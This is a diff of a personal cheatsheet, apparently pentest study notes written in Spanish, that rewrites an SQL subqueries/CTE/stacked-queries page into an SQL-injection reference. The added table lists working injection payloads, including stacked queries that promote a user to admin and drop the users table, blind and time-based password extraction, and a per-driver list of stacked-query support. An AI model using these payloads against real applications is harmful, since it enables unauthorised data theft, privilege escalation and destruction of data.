@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/cheatsheet
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: CheatSheet
 linked:
-  - "[[SQL Commands]]"
+  - '[[SQL Commands]]'
 ---
 # SQL - Subconsultas y Estructuras Avanzadas
 
@@ -19,20 +19,62 @@ linked:
 
 ## Cheatsheet
 
-|            **Concepto Clave**            |                          **Sintaxis Básica**                          | **Ejemplo Práctico**                                                                                                                                                                                   | **Propósito y Comportamiento**                                                                                                                                                                                                                                                                                                                                                                                                       |
-| :--------------------------------------: | :-------------------------------------------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-|         <br><br>**Subconsultas**         |             <br><br>`SELECT ... WHERE col = (SELECT ...)`             | <br><br>`SELECT nombre FROM empleados WHERE salario > (SELECT AVG(salario) FROM empleados);`                                                                                                           | <br>Son consultas anidadas dentro de otra consulta principal (`SELECT`, `INSERT`, `UPDATE` o `DELETE`). Operan como un mecanismo estándar para aislar y extraer datos dinámicos que luego se utilizan como condición de filtrado (en el `WHERE`) o como valores calculados.<br><br>                                                                                                                                                  |
-| <br><br>**Subconsultas Correlacionadas** | <br><br>`SELECT ... WHERE (SELECT ... WHERE interna.id = externa.id)` | <br><br>`SELECT nombre, salario FROM empleados ext WHERE salario > (SELECT AVG(salario) FROM empleados int WHERE int.departamento_id = ext.departamento_id);`                                          | <br>A diferencia de las subconsultas normales, la interna hace referencia a una o más columnas de la consulta externa, lo que obliga a que se evalúe **fila por fila**. Son útiles para comparaciones dinámicas donde el criterio de búsqueda depende de cada registro individual procesado.<br><br>                                                                                                                                 |
-|   <br><br>**Common Table Expressions**   |        <br><br>`WITH cte AS (SELECT ...) SELECT ... FROM cte`         | <br>`WITH VentasMes AS (SELECT id_empleado, SUM(total) as ventas FROM facturas GROUP BY id_empleado) SELECT e.nombre FROM empleados e JOIN VentasMes v ON e.id = v.id_empleado WHERE v.ventas > 5000;` | <br>Definen conjuntos de resultados temporales con nombre usando la cláusula `WITH`. Su propósito principal es simplificar consultas muy complejas, hacer el código mucho más legible, evitar la repetición de subconsultas y permitir la creación de consultas recursivas (para jerarquías o árboles).<br><br>                                                                                                                      |
-|       <br><br>**Stacked Queries**        |             <br><br>`consulta_original; NUEVA_SENTENCIA;`             | <br><br>`UPDATE inventario SET stock = stock - 1 WHERE id = 15; INSERT INTO registro_ventas (producto_id, fecha) VALUES (15, NOW());`                                                                  | <br>Permite ejecutar múltiples comandos secuenciales en una sola llamada usando el delimitador punto y coma (`;`). Es muy utilizado en scripts de migración, inicialización de bases de datos o dentro de transacciones donde se deben realizar operaciones encadenadas. _(Nota: El soporte para enviar múltiples sentencias a la vez depende del conector o API del lenguaje de programación que interactúe con el motor)._<br><br> |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `SELECT (SELECT password FROM users WHERE id=1)` | Subquery que devuelve 1 valor | Inline value retrieval — base de blind. |
+| `WHERE x = (SELECT MAX(id) FROM users)` | Filtra por resultado de subquery | Dynamic filtering. |
+| `WHERE EXISTS (SELECT 1 FROM users WHERE username='admin')` | TRUE si subquery tiene filas | Boolean blind sin SUBSTRING. |
+| `WHERE id IN (SELECT id FROM admins)` | Match contra lista de subquery | Bulk filtering. |
+| `WHERE col = (SELECT col FROM ext WHERE ext.id = main.id)` | Correlated subquery — eval por fila | Comparison contextual fila a fila. |
+| `WITH cte AS (SELECT id FROM users) SELECT * FROM cte` | CTE (Common Table Expression) | Queries complejas más legibles. PG/MSSQL/MySQL 8+. |
+| `WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<100) SELECT * FROM t` | CTE recursiva — genera serie | Generación dinámica de filas (bypass time-based con loops). |
+| `'; INSERT INTO logs VALUES('x')-- -` | Stacked query — segunda sentencia ejecuta | Backend con stacked support (MSSQL/PG/Java/.NET). |
+| `'; UPDATE users SET role='admin' WHERE id=2-- -` | UPDATE inyectada via stacked | Mismo, modificación destructiva. |
+| `'; DROP TABLE users-- -` | Destrucción de tabla | DESTRUCTIVO — solo en CTF/labs. |
+| `'; CREATE TABLE shells (cmd text); INSERT INTO shells VALUES ('id')-- -` | Setup para extraer data via canal alternativo | Stacked + storage. |
+| `SELECT IF((SELECT count(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)` | Boolean → time delay como signal | Time-based blind con subquery EXISTS. |
 ^sql-avanzado
 
+### Subquery vs JOIN — when to use
+
+```sql
+-- Subquery (scalar) — UN valor
+SELECT name, (SELECT count(*) FROM orders WHERE user_id=u.id) AS cnt FROM users u;
+
+-- JOIN — más eficiente para múltiples filas/columnas
+SELECT u.name, COUNT(o.id) FROM users u LEFT JOIN orders o ON o.user_id=u.id GROUP BY u.name;
+
+-- En SQLi típicamente preferimos subqueries porque pueden ir en cualquier expr
+WHERE id = (SELECT id FROM users LIMIT 0,1)
+```
+
+### Stacked queries — soporte por driver
+
+| Driver | Stacked |
+|:---:|:---:|
+| PHP `mysqli_query()` | ❌ |
+| PHP `mysqli_multi_query()` | ✅ |
+| PHP PDO MySQL (default) | ❌ |
+| PHP PDO con `PDO::ATTR_EMULATE_PREPARES=true` | ✅ |
+| PHP `mssql_query`/`sqlsrv_query` | ✅ |
+| Java JDBC | ✅ |
+| .NET SqlCommand | ✅ |
+| Node mysql2 | ❌ (default), ✅ con `multipleStatements: true` |
+| Python `mysql.connector` | ❌ |
 
 ___
 
 ## Overview
 
-La capacidad de estructurar consultas complejas y anidar lógicas de ejecución es vital para comprender cómo los motores de bases de datos resuelven operaciones en múltiples capas. En el contexto de la seguridad, el dominio de estas técnicas avanzadas me permite sortear limitaciones de sintaxis, extraer información de manera indirecta cuando los operadores convencionales no son viables y, en entornos configurados de forma permisiva, inyectar instrucciones administrativas completamente independientes del flujo original de la aplicación.
+**Subqueries** = queries anidadas. Núcleo de SQLi avanzada:
 
+- **Scalar subquery** en expression — `WHERE x = (SELECT ...)` para inyectar valor único.
+- **Correlated subquery** — eval por cada fila, costosa pero flexible.
+- **CTE** (`WITH`) — legibilidad + recursión.
+- **Recursive CTE** — generador de series (bypass time-based con loop).
 
-___
+**Stacked queries** = vector raro pero letal — ejecutar sentencias arbitrarias (`INSERT`/`UPDATE`/`DROP`/`CREATE`). PHP+MySQL default = ❌, pero MSSQL+Java/.NET = ✅.
+
+Identificar driver del backend determina si stacked es viable. Si no, todo va via UNION/subquery en single SELECT.
+
+***
